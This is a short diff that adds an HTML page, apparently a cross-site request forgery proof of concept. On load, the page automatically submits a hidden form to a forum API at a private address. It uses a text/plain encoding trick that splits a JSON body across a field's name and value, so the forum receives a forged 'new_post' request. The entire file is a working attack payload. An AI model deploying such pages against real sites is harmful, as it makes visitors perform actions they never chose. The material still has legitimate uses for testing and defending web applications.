@@ -1,0 +1,8 @@
+<html>
+	<head></head>
+	<body onload="document.forms[0].submit()">
+	   <form method="post" action="http://192.168.43.155/forum/api.php" enctype="text/plain">
+		<input type="hidden" name='{"action":"new_post","data":"this is a smart CSRF' value='"}'>
+	   </form>
+	</body>
+</html>
